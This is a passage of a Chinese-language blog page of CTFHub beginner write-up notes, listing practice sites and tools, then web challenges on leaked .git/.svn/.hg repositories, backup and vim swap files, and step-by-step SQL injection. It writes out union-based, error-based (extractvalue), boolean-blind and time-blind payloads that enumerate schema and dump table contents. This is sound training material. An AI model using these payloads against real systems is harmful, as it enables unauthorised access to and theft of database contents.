<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="简单记录一些笔记"><title>CTFHub入门笔记 | Disda</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.1/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.1/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.1/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="generator" content="Hexo 4.2.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CTFHub入门笔记</h1><a id="logo" href="/.">Disda</a><p class="description">Disda’s Dairy</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CTFHub入门笔记</h1><div class="post-meta">2023-03-29<span> | </span><span class="category"><a href="/categories/ctf/">ctf</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><div class="post-content"><p>收集和记录一下CTF入门的write up</p>
<a id="more"></a>

<!-- toc -->

<ul>
<li><a href="#网站">网站</a></li>
<li><a href="#工具">工具</a></li>
<li><a href="#web">Web</a><ul>
<li><a href="#前置技能">前置技能</a><ul>
<li><a href="#请求方式">请求方式</a></li>
<li><a href="#302跳转">302跳转</a></li>
<li><a href="#cookie">Cookie</a></li>
<li><a href="#基础认证">基础认证</a></li>
<li><a href="#响应包源代码">响应包源代码</a></li>
</ul>
</li>
<li><a href="#信息泄露">信息泄露</a><ul>
<li><a href="#目录遍历">目录遍历</a></li>
<li><a href="#phpinfo">phpinfo</a></li>
<li><a href="#hg泄露">hg泄露</a></li>
<li><a href="#svn泄露">SVN泄露</a></li>
<li><a href="#git泄露">Git泄露</a><ul>
<li><a href="#log">log</a></li>
<li><a href="#stash">Stash</a></li>
<li><a href="#index">index</a></li>
</ul>
</li>
<li><a href="#备份文件下载">备份文件下载</a><ul>
<li><a href="#网站源码">网站源码</a></li>
<li><a href="#bak文件">bak文件</a></li>
<li><a href="#vim缓存">vim缓存</a></li>
<li><a href="#ds_store">DS_Store</a></li>
</ul>
</li>
<li><a href="#字符型">字符型</a></li>
<li><a href="#报错注入">报错注入</a></li>
<li><a href="#布尔注入">布尔注入</a></li>
<li><a href="#mysql结构">MySQL结构</a></li>
<li><a href="#时间盲注">时间盲注</a></li>
<li><a href="#cookie注入">cookie注入</a></li>
<li><a href="#ua注入">UA注入</a></li>
<li><a href="#referer注入">Referer注入</a></li>
<li><a href="#过滤空格">过滤空格</a></li>
</ul>
</li>
<li><a href="#文件上传">文件上传</a><ul>
<li><a href="#无验证">无验证</a></li>
<li><a href="#前端验证">前端验证</a></li>
<li><a href="#htaccess">.htaccess</a></li>
<li><a href="#mime">MIME</a></li>
<li><a href="#文件头检查">文件头检查</a></li>
<li><a href="#00截断">00截断</a></li>
<li><a href="#双写后缀">双写后缀</a></li>
</ul>
</li>
<li><a href="#rce">RCE</a><ul>
<li><a href="#eval执行">eval执行</a></li>
<li><a href="#文件包含">文件包含</a></li>
<li><a href="#phpinput">php://input</a></li>
<li><a href="#读取源代码">读取源代码</a></li>
<li><a href="#远程包含">远程包含</a></li>
<li><a href="#命令注入">命令注入</a></li>
<li><a href="#过滤cat">过滤cat</a></li>
<li><a href="#过滤空格-1">过滤空格</a></li>
<li><a href="#过滤目录分割符">过滤目录分割符</a></li>
<li><a href="#过滤运算符">过滤运算符</a></li>
<li><a href="#综合练习">综合练习</a></li>
</ul>
</li>
<li><a href="#ssrf">SSRF</a><ul>
<li><a href="#内网访问">内网访问</a></li>
<li><a href="#伪协议读取文件">伪协议读取文件</a></li>
<li><a href="#端口扫描">端口扫描</a></li>
<li><a href="#post请求">POST请求</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#reverse">Reverse</a></li>
<li><a href="#crypto">Crypto</a></li>
<li><a href="#misc">Misc</a></li>
</ul>
<!-- tocstop -->

<h1><span id="网站">网站</span></h1><ul>
<li>刷题<ul>
<li><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">CTFHUB</a> 对新人极其友好，可以快速入门CTF</li>
<li><a href="https://buuoj.cn/login?next=%2Fchallenges%3F" target="_blank" rel="noopener">https://buuoj.cn/login?next=%2Fchallenges%3F</a></li>
<li><a href="https://ctf.bugku.com/" target="_blank" rel="noopener">https://ctf.bugku.com/</a></li>
</ul>
</li>
<li>搜索引擎<ul>
<li><a href="https://fofa.info/" target="_blank" rel="noopener">https://fofa.info/</a></li>
<li><a href="https://quake.360.net/quake/#/index" target="_blank" rel="noopener">https://quake.360.net/quake/#/index</a></li>
</ul>
</li>
</ul>
<h1><span id="工具">工具</span></h1><ul>
<li><p>BurpSuite</p>
<blockquote>
<p>​    Burp Suite是一个功能强大的集成渗透测试工具，旨在帮助安全测试人员执行各种 Web 应用程序安全测试。它提供了多个模块，包括代理、扫描器、爬虫、反射器、拦截器、重放器等功能，可协助测试人员发现应用程序中的漏洞，如SQL注入、跨站点脚本（XSS）、身份验证和会话问题、CSRF、文件包含漏洞等。</p>
</blockquote>
</li>
<li><p>WiresShark</p>
<blockquote>
<p>Wireshark是一款网络协议分析工具，可以帮助用户捕获和分析网络数据包。它能够实时抓取和展示网络上所有传输的数据，并提供多种过滤机制和统计图表，能够深入了解网络通信的细节，发现网络通信中可能存在的问题。</p>
</blockquote>
</li>
<li><p>fscan</p>
<blockquote>
<p>fscan是一款基于Python的网络渗透测试工具，它可以用于目标发现、端口扫描、漏洞检测等方面。fscan能够快速扫描大量IP地址和端口，并提供了多种扫描方式和过滤规则，例如TCP和UDP端口扫描、服务识别、OS指纹识别等。</p>
</blockquote>
</li>
<li><p>GitHack</p>
<blockquote>
<p>GitHack指的是一种基于Git版本控制系统的攻击技术。攻击者可以使用GitHack来获取敏感信息或执行未经授权的操作。攻击者通常会在Git上查找敏感信息，例如密码或私钥，并利用这些信息进一步入侵目标系统。</p>
</blockquote>
</li>
<li><p>dvcs-ripper</p>
<blockquote>
<p>可以支持svn、hg等文件下载</p>
</blockquote>
</li>
<li><p>PostMan</p>
<blockquote>
<p>Postman是一个<a href="https://baike.baidu.com/item/接口测试/1917757?fromModule=lemma_inlink" target="_blank" rel="noopener">接口测试</a>工具,在做接口测试的时候,Postman相当于一个客户端,它可以模拟用户发起的各类<a href="https://baike.baidu.com/item/HTTP请求/10882159?fromModule=lemma_inlink" target="_blank" rel="noopener">HTTP请求</a>,将请求<a href="https://baike.baidu.com/item/数据发送/22124759?fromModule=lemma_inlink" target="_blank" rel="noopener">数据发送</a>至<a href="https://baike.baidu.com/item/服务端/6492316?fromModule=lemma_inlink" target="_blank" rel="noopener">服务端</a>,获取对应的响应结果, 从而验证响应中的结果数据是否和预期值相匹配;并确保开发人员能够及时处理接口中的<a href="https://baike.baidu.com/item/bug/3353935?fromModule=lemma_inlink" target="_blank" rel="noopener">bug</a>,进而保证产品上线之后的稳定性和安全性</p>
</blockquote>
</li>
</ul>
<h1><span id="web">Web</span></h1><h3><span id="前置技能">前置技能</span></h3><h4><span id="请求方式">请求方式</span></h4><ul>
<li>思路：使用PostMan，修改请求方式为CTFHUB</li>
</ul>
<h4><span id="302跳转">302跳转</span></h4><p>使用浏览器访问index.php时，发现F12中network有302</p>
<ul>
<li>思路：使用curl访问index.php即可，因为curl不支持302跳转</li>
</ul>
<h4><span id="cookie">Cookie</span></h4><p><a href="https://www.wolai.com/ctfhub/6zSDRPLbitJ5j4e7CE9dLp" target="_blank" rel="noopener">参考</a>，使用<code>burpsuite</code>的<code>repeater</code>功能</p>
<h4><span id="基础认证">基础认证</span></h4><p><a href="https://www.wolai.com/ctfhub/3mSzAzbGydVT74nsq1gcVj" target="_blank" rel="noopener">参考</a>，使用<code>burpsuite</code>的<code>Intruder</code>功能</p>
<h4><span id="响应包源代码">响应包源代码</span></h4><p>使用F12直接在前端源代码里面查看</p>
<h3><span id="信息泄露">信息泄露</span></h3><h4><span id="目录遍历">目录遍历</span></h4><p>由于配置错误导致网站的目录可被遍历。</p>
<ul>
<li>思路：我们遍历网站即可找到结果</li>
</ul>
<h4><span id="phpinfo">phpinfo</span></h4><p>phpinfo()是php中查看相关信息的函数，当在页面中执行<code>phpinfo()</code>函数时，php会将自身的所有信息全部打印出来。在<code>phpinfo</code>中会泄露很多服务端的一些信息</p>
<ul>
<li>思路：flag暴露在phpinfo中</li>
</ul>
<h4><span id="hg泄露">hg泄露</span></h4><ul>
<li>思路：使用dirsearch发现有.hg文件夹，使用dvcs-ripper下载目录，但是工具没有将所有文件下下来，使用<code>tree</code>命令来查看目录，分析发现txt文件中有<code>add flag</code>，使用<code>grep -a -r flag</code>查看flag存在的文件名，通过curl来查看文件。</li>
</ul>
<h4><span id="svn泄露">SVN泄露</span></h4><ul>
<li>思路：使用dirsearch发现有.svn文件夹，使用dvcs-ripper下载目录，从 wc.db 中找到 flag 的文件的文件名, 尝试访问结果发现被删除了。查看<code>.svn/pristine/</code>中的文件，找到flag</li>
</ul>
<h4><span id="git泄露">Git泄露</span></h4><ul>
<li>思路：使用dirsearch发现有.git文件夹，使用githack工具将网站里的.git文件夹下载到本地</li>
</ul>
<h5><span id="log">log</span></h5><p>网站下可能有.git文件</p>
<ul>
<li>思路：我们通过<code>git log</code>查看提交日志，然后用过<code>git diff</code>来对比版本区别找到flag</li>
</ul>
<h5><span id="stash">Stash</span></h5><p>git可能有的文件放到stash暂存</p>
<ul>
<li>思路：通过<code>git stash list</code>查看，执行 git stash pop 发现从 git 栈中弹出来一个文件，这个文件的内容就是 flag</li>
</ul>
<h5><span id="index">index</span></h5><p>使用<code>git ls-file --stage</code>查看index file文件，使用<code>git log</code>命令查看历史记录，通过<code>git diff</code>对比提交版本。</p>
<h4><span id="备份文件下载">备份文件下载</span></h4><h5><span id="网站源码">网站源码</span></h5><ul>
<li>思路：网站源码可能放在目录里面，打开即可获取flag</li>
</ul>
<h5><span id="bak文件">bak文件</span></h5><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak</p>
<ul>
<li>思路：直接使用curl + url 即可访问</li>
</ul>
<h5><span id="vim缓存">vim缓存</span></h5><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容  </p>
<p>以index.php为例：第一次产生的交换文件名为<code>.index.php.swp</code>，再次意外退出后会产生名为 <code>.index.php.swo</code>的交换文件，第三次产生的交换文件则为 <code>.index.php.swn</code></p>
<ul>
<li>思路：使用curl访问，或者使用wget下载到本地再查看</li>
</ul>
<h5><span id="ds_store">DS_Store</span></h5><figure class="highlight plain"><figcaption><span>是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过```.DS_Store```可以知道这个目录里面所有文件的清单。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 思路：使用curl命令访问&#96;&#96;&#96;.DS_Store&#96;&#96;&#96; 文件即可</span><br><span class="line"></span><br><span class="line">### 密码口令</span><br><span class="line"></span><br><span class="line">#### 弱口令</span><br><span class="line"></span><br><span class="line">- 思路：看到管理系统默认账号为admin，密码先尝试用弱口令密码本攻击，发现无效</span><br><span class="line"></span><br><span class="line">#### 默认口令</span><br><span class="line"></span><br><span class="line">- 思路：靠社会工程的检索能力</span><br><span class="line"></span><br><span class="line">### SQL注入</span><br><span class="line"></span><br><span class="line">#### 整数型</span><br><span class="line"></span><br><span class="line">检查是否存在注入</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">xx &#x3D; ? and 1&#x3D;1 # 返回正确</span><br><span class="line">xx &#x3D; ? and 1&#x3D;2 # 返回错误</span><br></pre></td></tr></table></figure>

<p>猜字段数（x为数字） 得出字段数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? order by x</span><br></pre></td></tr></table></figure>

<p>爆数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,...,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span></span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,...,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span></span><br></pre></td></tr></table></figure>

<p>获得flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,...,<span class="keyword">group_concat</span>(flag) <span class="keyword">from</span> flag.flag</span><br></pre></td></tr></table></figure>

<p>其中… 的数量为<code>order by x</code>中的x</p>
<h4><span id="字符型">字符型</span></h4><p>字符型注入要考虑到  引号闭合  和  注释 </p>
<p>判断注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=1 <span class="comment"># 返回正确</span></span><br><span class="line">?id=1' and 1=2 <span class="comment"># 返回错误</span></span><br></pre></td></tr></table></figure>

<p>猜字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1' order by 2 <span class="comment"># 返回正确</span></span><br><span class="line">?id=1' order by 3 <span class="comment"># 返回错误</span></span><br></pre></td></tr></table></figure>

<p>爆数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'sqli'</span></span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span></span><br></pre></td></tr></table></figure>

<p>爆字段内容（flag）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure>

<h4><span id="报错注入">报错注入</span></h4><figure class="highlight plain"><figcaption><span>:对[XML](https://so.csdn.net/so/search?q</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;extractvalue(目标xml文档，xml路径)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第一个参数 : 第一个参数可以传入目标xml文档</p>
<p>第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
<p>可以用 0x5c  (‘)，还可以使用0x7e (~)，使得sql非法</p>
</blockquote>
<p>查询数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<p>爆数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<p><strong>mid函数</strong></p>
<blockquote>
<p>MID()函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p>
</blockquote>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td>必需。要提取字符的字段。</td>
</tr>
<tr>
<td>start</td>
<td>必需。规定开始位置（起始值是 1）。</td>
</tr>
<tr>
<td>length</td>
<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
</tr>
</tbody></table>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">16</span>),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">mid</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">17</span>),<span class="number">0x7e</span>))</span><br><span class="line"><span class="comment"># 拼接得到flag</span></span><br></pre></td></tr></table></figure>

<h4><span id="布尔注入">布尔注入</span></h4><p>只会返回正确或者错误，因此我们需要构造<code>if</code>语句进行注入，手动过程供参考，还是用sqlmap靠谱。</p>
<ul>
<li>先猜测数据库长度</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and (length(database()))&gt;5 # 结果是error</span><br><span class="line">1 and (length(database()))=4 <span class="comment"># 结果是success</span></span><br></pre></td></tr></table></figure>

<ul>
<li>猜测数据库名</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr(database(),1,1))&gt;110 # 可以二分法来确认每个字母</span><br></pre></td></tr></table></figure>

<ul>
<li>得到数据库表中数量</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<ul>
<li>得到表名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第一张数据表的第一个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第一张数据表的第二个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第一张数据表的第三个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="comment"># 最后得到表名为news</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第二张数据表的第一个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第二张数据表的第二个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第二张数据表的第三个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="comment"># 最后得到表名为flag</span></span><br></pre></td></tr></table></figure>

<ul>
<li>猜测flag表的字段数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name=<span class="string">'flag'</span>)=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到flag只有一个字段</span></span><br></pre></td></tr></table></figure>

<ul>
<li>猜测字段名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment">#(不断改变范围，把字段名猜解出来)</span></span><br><span class="line"><span class="comment">#......</span></span><br><span class="line"><span class="comment">#得到字段名也为flag</span></span><br></pre></td></tr></table></figure>

<ul>
<li>猜测flag</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((<span class="keyword">select</span> * <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> * <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> * <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#......</span></span><br><span class="line"><span class="comment">#这是一个巨大的工作量，所以应该积累到的一个经验是：</span></span><br><span class="line"><span class="comment">#手工盲注特别繁琐，碰到这类题目要会用工具sqlmap</span></span><br></pre></td></tr></table></figure>

<h4><span id="mysql结构">MySQL结构</span></h4><h4><span id="时间盲注">时间盲注</span></h4><p>原理和布尔盲注差不多，通过返回时间来判断</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((substr(database(),1,1)=<span class="string">'s'</span>),sleep(1),1)</span><br></pre></td></tr></table></figure>

<h4><span id="cookie注入">cookie注入</span></h4><p>首先通过抓包，发现浏览器返回cookie: id=1</p>
<p>使用postman进行发包处理</p>
